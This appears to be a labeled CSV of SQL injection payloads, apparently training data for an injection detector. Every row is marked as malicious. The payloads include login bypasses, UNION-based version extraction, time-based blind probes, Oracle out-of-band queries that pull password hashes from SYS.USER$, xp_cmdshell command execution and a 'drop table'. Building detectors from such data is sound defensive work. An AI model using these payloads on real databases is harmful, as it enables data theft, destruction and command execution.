payload,label,source
"select * from users where id  =  1 *\. union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 %  (  @  )   or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"or 'a'  =  'a",1,"Modified_SQL_Dataset"
"declare @s varchar  (  22  )   select @s   =",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select 1<@,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 + \+*\ union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#"". union select version  (    )  ,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"@variable",1,"Modified_SQL_Dataset"
"; exec master..xp_cmdshell",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 +  (  1  )   or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select @ 1$,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select @ 1a,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or  @$#  =  1 union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or   (  \.  )    =  1 union select 1,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select 1""!"",banner from v$version where rownum  =  1 -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""1]"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""$?"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"or x  =  x",1,"Modified_SQL_Dataset"
"or a  =  a",1,"Modified_SQL_Dataset"
"or '1'  =  '1",1,"Modified_SQL_Dataset"
"select * from users where id  =  11<1# union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
")    )    or    (    (   'x'   )    )     =     (    (   'x",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or \.<1 union select 1,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' <@&1 union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"; if is_srvrolemember  (  'sysadmin'  )   > 0 waitfor delay '0:0:2' --",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@<@ or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select @<@$,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' <@<@ union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""$_"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#""{ union select version  (    )  ,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"a' or 1  =  1--",1,"Modified_SQL_Dataset"
")   or   (  a  =  a",1,"Modified_SQL_Dataset"
"""   )    )    or    (    (   ""x""   )    )     =     (    (   ""x",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' <@$_ union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"-- &password  =",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@. or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  (    )  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 %$ 1 union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  3   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"admin' or 1  =  1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";,""  =  1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select @||1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 +\+. union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  )  ,"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"union select * from users where login   =   char  (  114,111,111,116  )  ;",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#""? union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"pg_sleep  (  __TIME__  )  --",1,"Modified_SQL_Dataset"
"‘ or 3  =  3 --",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 -1<@ union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""$#"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
")   union select * from information_schema.tables;",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  )  ]"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
")   or benchmark  (  10000000,MD5  (  1   )    )   #",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  column_name   )    )    FROM sys.all_tab_columns   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
""" or """" """,1,"Modified_SQL_Dataset"
"delete",1,"Modified_SQL_Dataset"
";waitfor delay '0:0:__TIME__'--",1,"Modified_SQL_Dataset"
"1' and non_existant_table   =   '1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""&  )  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' + $ . union select 1,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"declare @s varchar  (  200  )   select @s   =   0x77616974 ...",1,"Modified_SQL_Dataset"
"x' AND userid IS NULL; --",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";["" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or \.<   =  1 union select 1,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select @<@,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 -@<@ union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT host_name FROM v$instance   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 +   (  \+  )   or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "".["" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  (  ["" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"UNION ALL SELECT",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""1#"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or \<1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 | |1 union select 1,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"x' or full_name like '%bob%",1,"Modified_SQL_Dataset"
"x' and members.email is NULL; --",1,"Modified_SQL_Dataset"
"or 2 > 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.*1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"""  )   or pg_sleep  (  __TIME__  )  --",1,"Modified_SQL_Dataset"
"'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or $<\. union select 1,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""@  )  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or \.<$ or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
")   or sleep  (  __TIME__  )    =  '",1,"Modified_SQL_Dataset"
"sleep 50'",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' + 1||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 + $+%\ or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";  (  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"or sleep  (  __TIME__  )    =  '",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";_"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#"". union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select  @ $,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select +!<@,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@<@ union select null,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"; exec   (  'sel' + 'ect us' + 'er'  )",1,"Modified_SQL_Dataset"
"anything' OR 'x'  =  'x",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or \<\ union select 1,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 union select   (  1  )  ,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 *  (  \  )   union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"&'",1,"Modified_SQL_Dataset"
"a' or 3  =  3--",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or $+<$ union select 1,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 +1 union select 1,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"admin""or 1  =  1 or """"  =  """,1,"Modified_SQL_Dataset"
"uni/**/on sel/**/ect",1,"Modified_SQL_Dataset"
""" or """"&""",1,"Modified_SQL_Dataset"
")    )   ;waitfor delay '0:0:__TIME__'--",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""?;"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"1 waitfor delay '0:0:10'--",1,"Modified_SQL_Dataset"
"bfilename",1,"Modified_SQL_Dataset"
"admin'  )   or   (  '1'  =  '1'--",1,"Modified_SQL_Dataset"
"UEf",1,"Modified_SQL_Dataset"
"1 or sleep  (  __TIME__  )  #",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select $[""],@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' + @  (  1  )   union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"1' and 1  =    (  select count  (  *  )   from tablenames  )  ; --",1,"Modified_SQL_Dataset"
"or sleep  (  __TIME__  )  #",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#"",  =  1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"||6",1,"Modified_SQL_Dataset"
"or 1/*",1,"Modified_SQL_Dataset"
"and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,116   )    )   <>char  (  39,39   )    )   ,1,0   )    )   ;",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.%@ or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""..""  =  1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1&@#  =  1 union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";]"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or $<\. or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 *  (  1  )   union select 1,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"or 'whatever' in   (  'whatever'  )",1,"Modified_SQL_Dataset"
"declare @s varchar   (  200  )   select @s   =   0x73656c65637420404076657273696f6e exec  (  @s  )",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1'   or 1  =  1 -- 1'",1,"Modified_SQL_Dataset"
"?",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT COUNT  (  DISTINCT  (  table_name   )    )    FROM sys.all_tables   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select @ 1,version  (    )   --  1'",1,"Modified_SQL_Dataset"
"admin""  )   or   (  ""1""  =  ""1""#",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#"", union select 'a',version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""$  (  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"or '' '",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or "";#"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"or 1  =  1",1,"Modified_SQL_Dataset"
"; drop table temp --",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
""" or benchmark  (  10000000,MD5  (  1   )    )   #",1,"Modified_SQL_Dataset"
""" or ""x""  =  ""x",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1'<@.. or 1  =  1 -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or !<@ union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"or 'something' like 'some%'",1,"Modified_SQL_Dataset"
"; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 0  )   waitfor delay '0:0:2' --",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  PASSWORD  )   FROM   (  SELECT DISTINCT  (  PASSWORD  )  , ROWNUM AS LIMIT FROM SYS.USER$  )   WHERE LIMIT  =  4   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or \<\. or 1  =  1 -- 1'",1,"Modified_SQL_Dataset"
"; exec master..xp_cmdshell 'ping 10.10.1.2'--",1,"Modified_SQL_Dataset"
"admin' or '1'  =  '1'--",1,"Modified_SQL_Dataset"
"; if not   (    (   select serverproperty  (  'isintegratedsecurityonly'   )    )    <> 1  )   waitfor delay '0:0:2' --",1,"Modified_SQL_Dataset"
"AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  2   )    )    AND 'i'  =  'i",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@<@ union select version  (    )  ,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#""$ union select null,version  (    )   -- 1",1,"Modified_SQL_Dataset"
""";waitfor delay '0:0:__TIME__'--",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' *$ 1 or 1  =  1 -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or \<\ union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""?@"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"’ or ‘1’  =  ’1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select 1a,banner from v$version where rownum  =  1 -- 1'",1,"Modified_SQL_Dataset"
"admin'or 1  =  1 or ''  =  '",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' or !<1 union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"and 1  =    (   if   (    (   load_file  (  char  (  110,46,101,120,11 ...",1,"Modified_SQL_Dataset"
"exec  (  @s  )",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or \.<   =  1 union select 1,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 + $+%1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.  union select version  (    )  ,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"x' AND email IS NULL; --",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' + @ @1 union select 1,version  (    )   -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1'   union select null,banner from v$version where rownum  =  1 -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  11||1 union select 1,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.*1 union select 1,banner from v$version where rownum  =  1 -- 1",1,"Modified_SQL_Dataset"
"update",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.<1# union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"""   )    )    or pg_sleep  (  __TIME__  )  --",1,"Modified_SQL_Dataset"
"||'6",1,"Modified_SQL_Dataset"
"select * from users where id  =  1. <@ union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"or   (  EXISTS  )",1,"Modified_SQL_Dataset"
"^'",1,"Modified_SQL_Dataset"
"or 'text'   =   n'text'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 + \+*$ union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select $ _,@@VERSION -- 1'",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  )  ;"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@1$ union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"or 0  =  0 --",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""{1""  =  1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""{,""  =  1 or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#"", union select version  (    )  ,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or 1#""? union select 'a',version  (    )   -- 1",1,"Modified_SQL_Dataset"
"password:*/  =  1--",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 <@. union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  )  @"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  '1' union select @ @1,version  (    )   --  1'",1,"Modified_SQL_Dataset"
"union   (  select NULL,   (  select @@version   )    )    --",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 or ""  )  {"" or 1  =  1 -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1.<@. union select 1,version  (    )   -- 1",1,"Modified_SQL_Dataset"
"select * from users where id  =  1 +\. union select null,@@VERSION -- 1",1,"Modified_SQL_Dataset"
